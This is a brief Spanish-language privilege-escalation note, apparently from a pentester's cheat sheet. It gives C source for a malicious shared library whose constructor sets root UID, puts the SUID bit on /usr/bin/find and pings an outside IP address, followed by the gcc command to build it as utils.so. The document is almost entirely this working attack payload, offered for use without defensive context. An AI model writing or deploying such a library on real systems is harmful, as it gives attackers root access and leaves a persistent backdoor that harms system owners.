Si tenemos que crear un ejecutable para escalar privilegios esta opcion es muy interesante ya que le asigana el bit s a find que es muy facil de explotar:

```
# include <stdio.h>
# include <stdlib.h>
# include <sys/types.h>

static void kashz() __attribute__((constructor));
void kashz() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("chmod +s /usr/bin/find");
        system("ping 192.168.45.220 -c 2");
}

```

Compilar con el siguiente comando:

```
gcc -shared -o utils.so -fPIC library.c
```